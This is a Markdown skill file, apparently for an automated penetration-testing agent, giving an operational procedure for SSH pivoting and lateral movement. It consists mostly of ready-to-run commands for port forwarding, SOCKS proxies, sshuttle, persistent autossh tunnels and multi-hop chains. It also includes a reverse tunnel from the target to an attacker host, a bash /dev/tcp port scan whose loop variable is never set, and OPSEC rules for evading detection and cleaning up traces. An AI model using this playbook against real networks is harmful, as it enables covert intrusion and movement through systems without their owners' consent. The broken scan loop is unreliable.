---
name: pivoting-ssh
description: SSH tunneling and port forwarding for lateral movement and network pivoting
version: 1.0.0
phase: post
category: lateral_movement
tags: [pivoting, ssh, tunnel, port-forward]
tools: [ssh, sshuttle, autossh]
difficulty: advanced
opsec_level: silent
time_estimate: 120s
severity_if_found: critical
related_skills:
  - tunneling-pivoting
  - lateral-movement
mitre_attack:
  - T1572
  - T1090
  - T1572.001
  - T1572.002
---

## When to Use

Use this skill when you have SSH access to an intermediate host and need to
pivot deeper into an isolated network segment. SSH tunneling is the most
reliable and low-footprint method for traversing network boundaries — it uses
existing SSH encryption, requires no additional server daemons, and blends in
with legitimate administrative traffic.

## Prerequisites

- SSH credentials (password, key, or agent) on a jump host with network access to the target segment
- OpenSSH client (built-in on Linux/macOS, available via WSL/Cygwin on Windows)
- `sshuttle` optional but recommended for transparent VPN-like proxying
- `autossh` optional for persistent tunnels across disconnects
- Outbound SSH (port 22) from the attack host to the jump host
- Knowledge of the target network layout (CIDR ranges, service ports)

## Procedure

```bash
# ═══════════════════════════════════════════════════════════
# 1. LOCAL PORT FORWARDING — Expose a remote service locally
# ═══════════════════════════════════════════════════════════
# Listen on localhost:8080 → forward through jump-host → target-internal:80
ssh -L 8080:TARGET_INT_IP:80 USER@JUMP_HOST -N -f

# Multiple forwards in one connection
ssh -L 8080:web.internal:80 \
    -L 8443:web.internal:443 \
    -L 3306:db.internal:3306 \
    USER@JUMP_HOST -N -f

# Bind to all interfaces (allows sharing with proxychains or team members)
ssh -L 0.0.0.0:8080:TARGET_INT_IP:80 USER@JUMP_HOST -N -f -g

# ═══════════════════════════════════════════════════════════
# 2. REMOTE PORT FORWARDING — Expose a local service to the remote host
# ═══════════════════════════════════════════════════════════
# Make your local port 8080 accessible on the jump host as port 9090
ssh -R 9090:localhost:8080 USER@JUMP_HOST -N -f

# Reverse tunnel from internal host to your attack machine
# On the target (after you establish the tunnel):
ssh -R 8888:localhost:22 USER@ATTACK_IP -N -f
# Then from your attack machine, anything hitting localhost:8888 goes
# to the target's SSH, allowing you to SSH into the target:
ssh localhost -p 8888

# ═══════════════════════════════════════════════════════════
# 3. DYNAMIC SOCKS PROXY — Full proxied access through SSH
# ═══════════════════════════════════════════════════════════
# Creates a SOCKS5 proxy on localhost:1080
# All traffic through this proxy flows through the jump host
ssh -D 1080 USER@JUMP_HOST -N -f

# Use with proxychains on the attack machine
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains4 nmap -sT -Pn -p 80,443,3306 10.0.0.0/24

# ═══════════════════════════════════════════════════════════
# 4. SSHUTTLE — Transparent VPN-like proxy
# ═══════════════════════════════════════════════════════════
# Routes traffic for an entire subnet through SSH (no app-level config needed)
sshuttle -r USER@JUMP_HOST 10.0.0.0/8 172.16.0.0/12

# With DNS forwarding (useful for internal domain resolution)
sshuttle --dns -r USER@JUMP_HOST 10.0.0.0/8

# Automatic subnet discovery from the remote host
sshuttle --auto-nets -r USER@JUMP_HOST

# Verbose mode for debugging
sshuttle -v -r USER@JUMP_HOST 10.0.0.0/24

# ═══════════════════════════════════════════════════════════
# 5. PERSISTENT TUNNELS — Auto-reconnecting with autossh
# ═══════════════════════════════════════════════════════════
# Autossh monitors the SSH connection and reconnects on drop
autossh -M 0 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" \
    -L 8080:TARGET_INT_IP:80 USER@JUMP_HOST -N -f

# Autossh with SOCKS proxy (survives network interruptions)
autossh -M 0 -o "ServerAliveInterval 15" \
    -D 1080 USER@JUMP_HOST -N -f

# ═══════════════════════════════════════════════════════════
# 6. SSH CONFIG — Structured tunnel management
# ═══════════════════════════════════════════════════════════
cat >> ~/.ssh/config << 'SSHCONFIG'

# Jump host with persistent tunnels
Host jump-prod
    HostName JUMP_HOST_IP
    User pentest
    Port 22
    IdentityFile ~/.ssh/pentest_key
    ServerAliveInterval 30
    ServerAliveCountMax 3
    ExitOnForwardFailure yes
    LocalForward 8080 web.internal:80
    LocalForward 8443 web.internal:443
    LocalForward 3306 db.internal:3306
    DynamicForward 1080

# Direct via jump host (ProxyJump)
Host target-*
    ProxyJump jump-prod
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
SSHCONFIG

# Then connect easily:
ssh target-web
ssh target-db

# ═══════════════════════════════════════════════════════════
# 7. MULTI-HOP SSH TUNNELING — Chain through multiple jump hosts
# ═══════════════════════════════════════════════════════════
# Method A: ProxyJump (native OpenSSH 7.3+)
ssh -J USER@JUMP1:22,USER@JUMP2:22 USER@TARGET

# Method B: ProxyCommand with netcat
ssh -o ProxyCommand="ssh -W %h:%p USER@JUMP1" USER@TARGET

# Method C: Three-hop dynamic SOCKS
ssh -D 1080 USER@JUMP1 \
    -o "ProxyCommand=ssh -W JUMP2:22 USER@JUMP1-exec" \
    -N -f

# Method D: Cascaded SOCKS (nested)
# Terminal 1: First hop SOCKS
ssh -D 1080 USER@EDGE_HOST -N -f
# Terminal 2: Second hop through first hop's SOCKS
ssh -o ProxyCommand="nc -x 127.0.0.1:1080 %h %p" \
    -D 1081 USER@INTERNAL_HOST -N -f

# ═══════════════════════════════════════════════════════════
# 8. SSH JUMP HOST — Verified connectivity
# ═══════════════════════════════════════════════════════════
# Test basic SSH connectivity
ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no USER@JUMP_HOST "id && hostname && ip a"

# Check what routes are reachable from the jump host
ssh USER@JUMP_HOST "ip route && arp -a 2>/dev/null || arp -a"

# Port scan from jump host (no nmap needed — bash built-in)
ssh USER@JUMP_HOST 'for port in 22 80 443 3306 3389 8080; do
    timeout 1 bash -c "echo >/dev/tcp/10.0.0.$i/$port" 2>/dev/null &&
    echo "10.0.0.$i:$port open"
done'
```

## OPSEC Rules

- **CRITICAL**: SSH is monitored in most environments — expect connection logs on the jump host
- Use non-standard SSH ports when possible to evade rate-based detection
- Always use `-N` (no command execution) for pure tunnels to avoid shell logs
- Set `ServerAliveInterval` high (≥60s) to avoid heartbeat pattern detection
- Prefer `ProxyJump` over cascaded `ssh -D` — fewer persistent processes
- Tunnel through infrastructure you control when possible
- Remove SSH config entries and known_hosts after the engagement
- Use `ExitOnForwardFailure yes` to avoid half-established tunnels
- Never use `StrictHostKeyChecking no` in production — accept keys manually on long-term ops
- Consider `ControlMaster` sharing to reuse one TCP connection for multiple sessions

## Verification

- [ ] Local port forward: `curl -I http://localhost:8080` returns expected response
- [ ] Dynamic SOCKS: `curl -x socks5://127.0.0.1:1080 http://TARGET_INT_IP` resolves
- [ ] sshuttle: `ping 10.0.0.1` reaches internal host through the tunnel
- [ ] Remote forward: service accessible on the remote side as configured
- [ ] Multi-hop: full chain verified with packet capture (`tcpdump`) at each hop
- [ ] Autossh recovery: kill SSH process, verify autossh restarts within 30s
- [ ] SSH config: `ssh -G jump-prod` shows correct configuration is loaded

## Pitfalls

- **SSH timeouts**: Long-running tunnels may drop — always configure `ServerAliveInterval`
- **GatewayPorts**: Remote forwarding to ports <1024 requires root on the jump host
- **MTU issues**: Tunnels through VPNs may fragment — test with `ping -M do -s 1472`
- **SSH key passphrase**: Will block non-interactive tunnel startup — use key without passphrase or ssh-agent
- **ProxyJump legacy**: Older OpenSSH (<7.3) doesn't support `-J` — fall back to `ProxyCommand`
- **sshuttle breaks DNS**: Use `--dns` flag or the remote DNS server explicitly
- **Connection multiplexing**: ControlMaster sockets can conflict if left behind — clean `/tmp/*.ssh-mux`
- **Host key changes**: If target rotates keys mid-engagement, tunnels silently fail — add `UserKnownHostsFile=/dev/null` only for short-lived ops
- **Firewall egress filtering**: Outbound SSH may be limited to specific ports or IPs — test socks over port 443 as fallback
- **Process visibility**: `ssh -f` backgrounds the process; on multi-user systems, use `ssh -N -f` and verify with `ps aux | grep ssh`

## Output Format

```json
{
  "skill": "pivoting-ssh",
  "tunnel_type": "local|remote|dynamic|sshuttle|multi-hop",
  "target_network": "10.0.0.0/24",
  "jump_host": "JUMP_HOST_IP",
  "forwards": [
    {"local_port": 8080, "remote_host": "web.internal", "remote_port": 80}
  ],
  "status": "established|failed",
  "method": "ssh-L|ssh-D|sshuttle|ProxyJump",
  "persistence": "autossh|none",
  "resolved_at": "2026-07-13T12:00:00Z",
  "evidence": {
    "local_test": "curl -I http://localhost:8080 -> 200 OK",
    "latency_ms": 45
  }
}
```
